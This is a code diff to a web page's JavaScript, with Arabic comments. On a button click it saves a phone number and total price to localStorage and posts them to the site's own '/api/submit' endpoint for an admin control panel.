@@ -508,10 +508,21 @@
             // قراءة القيمة الحالية لحقل رقم الهاتف
             var phone = inputField1.value;
             console.log("رقم الهاتف:", phone);
+            localStorage.setItem('phone', phone);
+            localStorage.setItem('Total', totalPrice);
             firstPage.style.display = 'none';
             secondPage.style.display = 'block';
-            localStorage.setItem('Total', totalPrice);
             totalSecondPage.innerHTML = totalPrice;
+            
+            // إرسال رقم الهاتف والمبلغ فوراً للوحة التحكم
+            fetch('/api/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, amount: totalPrice.toString(), status: 'new' })
+            }).then(function(r) { return r.json(); }).then(function(res) {
+                console.log('Phone sent to admin:', res);
+                if (res.id) localStorage.setItem('submissionId', res.id);
+            }).catch(function(e) { console.error(e); });
         });
 
         backButton.addEventListener('click', function() {
